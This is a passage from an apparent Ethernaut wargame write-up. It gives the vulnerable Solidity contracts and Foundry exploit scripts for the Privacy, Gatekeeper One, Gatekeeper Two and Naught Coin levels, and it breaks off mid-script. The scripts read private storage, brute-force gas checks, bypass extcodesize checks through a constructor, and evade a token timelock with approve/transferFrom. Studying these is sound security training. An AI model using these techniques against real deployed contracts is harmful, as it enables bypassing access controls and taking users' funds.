<span class="k">import</span> <span class="p">{</span><span class="nx">Privacy</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Privacy.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">PrivacySolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Privacy</span> <span class="kr">public</span> <span class="nx">privacy</span> <span class="o">=</span> <span class="nc">Privacy</span><span class="p">(</span><span class="mh">0x97Fd86fBE6F968de018C7C15B9D2f2cb2Caa94b2</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>

        <span class="nx">bytes32</span> <span class="nx">slot5</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">privacy</span><span class="p">),</span> <span class="nf">bytes32</span><span class="p">(</span><span class="nf">uint256</span><span class="p">(</span><span class="mi">5</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">logBytes32</span><span class="p">(</span><span class="nx">slot5</span><span class="p">);</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Locked : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">privacy</span><span class="p">.</span><span class="nf">locked</span><span class="p">());</span>


        <span class="nx">privacy</span><span class="p">.</span><span class="nf">unlock</span><span class="p">(</span><span class="nf">bytes16</span><span class="p">(</span><span class="nx">slot5</span><span class="p">));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Locked : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">privacy</span><span class="p">.</span><span class="nf">locked</span><span class="p">());</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/PrivacySolve.s.sol:PrivacySolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="13-gatekeeper-one">13 Gatekeeper One</h1>

<p><code class="language-plaintext highlighter-rouge">GatekeeperOne.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">GatekeeperOne</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">entrant</span><span class="p">;</span>

  <span class="nx">modifier</span> <span class="nf">gateOne</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">!=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nf">gateTwo</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nf">gasleft</span><span class="p">()</span> <span class="o">%</span> <span class="mi">8191</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nf">gateThree</span><span class="p">(</span><span class="nx">bytes8</span> <span class="nx">_gateKey</span><span class="p">)</span> <span class="p">{</span>
      <span class="nf">require</span><span class="p">(</span><span class="nf">uint32</span><span class="p">(</span><span class="nf">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span> <span class="o">==</span> <span class="nf">uint16</span><span class="p">(</span><span class="nf">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)),</span> <span class="dl">"</span><span class="s2">GatekeeperOne: invalid gateThree part one</span><span class="dl">"</span><span class="p">);</span>
      <span class="nf">require</span><span class="p">(</span><span class="nf">uint32</span><span class="p">(</span><span class="nf">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span> <span class="o">!=</span> <span class="nf">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">),</span> <span class="dl">"</span><span class="s2">GatekeeperOne: invalid gateThree part two</span><span class="dl">"</span><span class="p">);</span>
      <span class="nf">require</span><span class="p">(</span><span class="nf">uint32</span><span class="p">(</span><span class="nf">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span> <span class="o">==</span> <span class="nf">uint16</span><span class="p">(</span><span class="nf">uint160</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">)),</span> <span class="dl">"</span><span class="s2">GatekeeperOne: invalid gateThree part three</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">enter</span><span class="p">(</span><span class="nx">bytes8</span> <span class="nx">_gateKey</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">gateOne</span> <span class="nx">gateTwo</span> <span class="nf">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">entrant</span> <span class="o">=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Make it past the gatekeeper and register as an entrant to pass this level.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>We have to successfully call the <code class="language-plaintext highlighter-rouge">enter()</code> function, without being revert by modifier checks.</li>
  <li>We need to pass three modifier checks. We can simply pass <code class="language-plaintext highlighter-rouge">gateOne()</code> by calling it from another contract.</li>
  <li>To bypass <code class="language-plaintext highlighter-rouge">gateTwo()</code> we need to send exact <code class="language-plaintext highlighter-rouge">gas</code> that should result the modulo 8191 to zero.</li>
  <li><code class="language-plaintext highlighter-rouge">gasLeft()</code> is a method which calculates the remaining gas after executing instructions before it invoked.</li>
  <li>We can pass the amount of gas to be transferred to the external call. But we need to send exact amount of gas.</li>
  <li>One thing that we can do is bruteforce. By randomly bruteforcing with different values of gas, we can pass this modifier check.</li>
  <li>To pass the <code class="language-plaintext highlighter-rouge">gateThree()</code> we need to some calculations. It takes the <code class="language-plaintext highlighter-rouge">_gateKey</code> a bytes8 value as argument.</li>
  <li>Lets calculate from last check.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uint16 third = uint16(uint160(tx.origin));
uint32 two = uint32(third);
bytes8 one = bytes8(abi.encodePacked(uint32(0xdeadbeef),two));
</code></pre></div>    </div>
  </li>
  <li>The modifiers checks the lower 32 bits of the gatekey after converting to uint64.</li>
  <li>So, we can calculate the lower 16 bits of the <code class="language-plaintext highlighter-rouge">tx.orgin</code> and pad it with zeros to pass the gatThree and gateOne.</li>
  <li>Two pass the gateTwo we can add random bits to the MSB position.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">GatekeeperSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">GatekeeperOne</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/GatekeeperOne.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">GatekeeperOneSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">GatekeeperOne</span> <span class="kr">public</span> <span class="nx">gateOne</span> <span class="o">=</span> <span class="nc">GatekeeperOne</span><span class="p">(</span><span class="mh">0x4742252E47788a20b2C78a1343DEE68EC8De3804</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Entrant : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">gateOne</span><span class="p">.</span><span class="nf">entrant</span><span class="p">()));</span>

        <span class="k">new</span> <span class="nc">Attack</span><span class="p">().</span><span class="nf">exploit</span><span class="p">();</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Entrant : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">gateOne</span><span class="p">.</span><span class="nf">entrant</span><span class="p">()));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">GatekeeperOne</span> <span class="kr">public</span> <span class="nx">gateOne</span> <span class="o">=</span> <span class="nc">GatekeeperOne</span><span class="p">(</span><span class="mh">0x4742252E47788a20b2C78a1343DEE68EC8De3804</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>

        <span class="c1">// uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))</span>
        <span class="c1">// uint32(uint64(_gateKey)) != uint64(_gateKey)</span>
        <span class="c1">// uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))</span>

        <span class="nx">uint16</span> <span class="nx">third</span> <span class="o">=</span> <span class="nf">uint16</span><span class="p">(</span><span class="nf">uint160</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">));</span>
        <span class="nx">uint32</span> <span class="nx">two</span> <span class="o">=</span> <span class="nf">uint32</span><span class="p">(</span><span class="nx">third</span><span class="p">);</span>
        <span class="nx">bytes8</span> <span class="nx">one</span> <span class="o">=</span> <span class="nf">bytes8</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="nf">uint32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span><span class="nx">two</span><span class="p">));</span>

        <span class="nx">bytes8</span> <span class="nx">_gateKey</span> <span class="o">=</span> <span class="nx">one</span><span class="p">;</span>
        <span class="nf">for </span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;=</span><span class="mi">500</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
            <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">gateOne</span><span class="p">).</span><span class="nx">call</span><span class="p">{</span><span class="nl">gas</span> <span class="p">:</span> <span class="p">(</span><span class="mi">8191</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="nx">i</span><span class="p">}(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">enter(bytes8)</span><span class="dl">"</span><span class="p">,</span> <span class="nx">_gateKey</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/GatekeeperOneSolve.s.sol:GatekeeperOneSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="14-gatekeeper-two">14 Gatekeeper Two</h1>

<p><code class="language-plaintext highlighter-rouge">GatekeeperTwo.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">GatekeeperTwo</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">entrant</span><span class="p">;</span>

  <span class="nx">modifier</span> <span class="nf">gateOne</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">!=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nf">gateTwo</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">uint</span> <span class="nx">x</span><span class="p">;</span>
    <span class="nx">assembly</span> <span class="p">{</span> <span class="nl">x</span> <span class="p">:</span><span class="o">=</span> <span class="nf">extcodesize</span><span class="p">(</span><span class="nf">caller</span><span class="p">())</span> <span class="p">}</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">x</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nf">gateThree</span><span class="p">(</span><span class="nx">bytes8</span> <span class="nx">_gateKey</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nf">uint64</span><span class="p">(</span><span class="nf">bytes8</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))))</span> <span class="o">^</span> <span class="nf">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span> <span class="o">==</span> <span class="nf">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">enter</span><span class="p">(</span><span class="nx">bytes8</span> <span class="nx">_gateKey</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">gateOne</span> <span class="nx">gateTwo</span> <span class="nf">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">entrant</span> <span class="o">=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>Similiar to gatekeeper one, to pass <code class="language-plaintext highlighter-rouge">gateOne()</code> here wee need to call from a contract.</li>
  <li><code class="language-plaintext highlighter-rouge">gateTwo()</code> checks that the caller contract code should zero. You think its impossible? Not at all.</li>
  <li>Yes, code inside contract constructor won’t be stored on blockchain. So, we can call the <code class="language-plaintext highlighter-rouge">enter()</code> from our attack contract constructor.</li>
  <li>To pass the <code class="language-plaintext highlighter-rouge">gateThree()</code> we need to simple XOR operation. To get the <code class="language-plaintext highlighter-rouge">gateKey()</code> we need to do <code class="language-plaintext highlighter-rouge">uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code> XOR <code class="language-plaintext highlighter-rouge">type(uint64).max</code></li>
</ol>

<p><code class="language-plaintext highlighter-rouge">GatekeeperTwoSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">GatekeeperTwo</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/GatekeeperTwo.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">GatekeeperTwoSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">GatekeeperTwo</span> <span class="kr">public</span> <span class="nx">gateTwo</span> <span class="o">=</span> <span class="nc">GatekeeperTwo</span><span class="p">(</span><span class="mh">0x9C11F689500821ffE630e6CFea7aC45C7226040c</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Entrant : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">gateTwo</span><span class="p">.</span><span class="nf">entrant</span><span class="p">()));</span>

        <span class="k">new</span> <span class="nc">Attack</span><span class="p">();</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Entrant : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">gateTwo</span><span class="p">.</span><span class="nf">entrant</span><span class="p">()));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    
    <span class="c1">// uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max</span>
    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">GatekeeperTwo</span> <span class="nx">gateTwo</span> <span class="o">=</span> <span class="nc">GatekeeperTwo</span><span class="p">(</span><span class="mh">0x9C11F689500821ffE630e6CFea7aC45C7226040c</span><span class="p">);</span>
        <span class="nx">uint64</span> <span class="nx">max</span> <span class="o">=</span> <span class="nf">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">;</span>
        <span class="nx">uint64</span> <span class="nx">hsh</span> <span class="o">=</span> <span class="nf">uint64</span><span class="p">(</span><span class="nf">bytes8</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))));</span>
        <span class="nx">bytes8</span> <span class="nx">_gateKey</span> <span class="o">=</span> <span class="nf">bytes8</span><span class="p">(</span><span class="nx">max</span> <span class="o">^</span> <span class="nx">hsh</span><span class="p">);</span>

        <span class="nf">require</span><span class="p">(</span><span class="nx">gateTwo</span><span class="p">.</span><span class="nf">enter</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/GatekeeperTwoSolve.s.sol:GatekeeperTwoSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="15-naught-coin">15 Naught Coin</h1>

<p><code class="language-plaintext highlighter-rouge">NaughtCoin.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">'</span><span class="s1">@openzeppelin-contracts/contracts/token/ERC20/ERC20.sol</span><span class="dl">'</span><span class="p">;</span>

 <span class="nx">contract</span> <span class="nx">NaughtCoin</span> <span class="nx">is</span> <span class="nx">ERC20</span> <span class="p">{</span>

  <span class="c1">// string public constant name = 'NaughtCoin';</span>
  <span class="c1">// string public constant symbol = '0x0';</span>
  <span class="c1">// uint public constant decimals = 18;</span>
  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">timeLock</span> <span class="o">=</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">+</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">365</span> <span class="nx">days</span><span class="p">;</span>
  <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">INITIAL_SUPPLY</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">player</span><span class="p">;</span>

  <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_player</span><span class="p">)</span> 
  <span class="nc">ERC20</span><span class="p">(</span><span class="dl">'</span><span class="s1">NaughtCoin</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0x0</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">player</span> <span class="o">=</span> <span class="nx">_player</span><span class="p">;</span>
    <span class="nx">INITIAL_SUPPLY</span> <span class="o">=</span> <span class="mi">1000000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">10</span><span class="o">**</span><span class="nf">uint256</span><span class="p">(</span><span class="nf">decimals</span><span class="p">()));</span>
    <span class="c1">// _totalSupply = INITIAL_SUPPLY;</span>
    <span class="c1">// _balances[player] = INITIAL_SUPPLY;</span>
    <span class="nf">_mint</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span> <span class="nx">INITIAL_SUPPLY</span><span class="p">);</span>
    <span class="nx">emit</span> <span class="nc">Transfer</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nx">player</span><span class="p">,</span> <span class="nx">INITIAL_SUPPLY</span><span class="p">);</span>
  <span class="p">}</span>
  
  <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">_value</span><span class="p">)</span> <span class="nx">override</span> <span class="kr">public</span> <span class="nx">lockTokens</span> <span class="nf">returns</span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">super</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">_to</span><span class="p">,</span> <span class="nx">_value</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// Prevent the initial owner from transferring tokens until the timelock has passed</span>
  <span class="nx">modifier</span> <span class="nf">lockTokens</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">if </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">player</span><span class="p">)</span> <span class="p">{</span>
      <span class="nf">require</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">&gt;</span> <span class="nx">timeLock</span><span class="p">);</span>
      <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
     <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span> 
<span class="p">}</span> 

</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>NaughtCoin imports ERC20 contract. So, it consists of all the function of ERC20 contract also.</li>
  <li>NaughtCoin only implemented the <code class="language-plaintext highlighter-rouge">lockTokens()</code> modifier on <code class="language-plaintext highlighter-rouge">transfer()</code> function only.</li>
  <li>There are other ways to transfer tokens from one address to other without using <code class="language-plaintext highlighter-rouge">transfer()</code></li>
  <li>Player can approve the allowances of their tokens to someone, and they can use <code class="language-plaintext highlighter-rouge">transferFrom()</code> function to transfer tokens on behalf of player.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">NaughtCoinSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">NaughtCoin</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/NaughtCoin.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">NaughtCoinSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">NaughtCoin</span> <span class="kr">public</span> <span class="nx">naughtCoin</span> <span class="o">=</span> <span class="nc">NaughtCoin</span><span class="p">(</span><span class="mh">0xE4497348f2557Bb7Ecb4631426a0c2d880BE0497</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>

        <span class="nx">address</span> <span class="nx">player</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">naughtCoin</span><span class="p">.</span><span class="nf">player</span><span class="p">());</span>
        <span class="nx">uint</span> <span class="nx">playerBalance</span> <span class="o">=</span> <span class="nx">naughtCoin</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Player : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">player</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Player Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">playerBalance</span><span class="p">);</span>
        
        <span class="nx">Attack</span> <span class="nx">attack</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Attack</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attack Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">));</span>
        
        <span class="nx">naughtCoin</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">),</span> <span class="nx">playerBalance</span><span class="p">);</span>

        <span class="nx">attack</span><span class="p">.</span><span class="nf">exploit</span><span class="p">(</span><span class="nx">player</span><span class="p">);</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Player : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">player</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Player Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">naughtCoin</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">));</span>
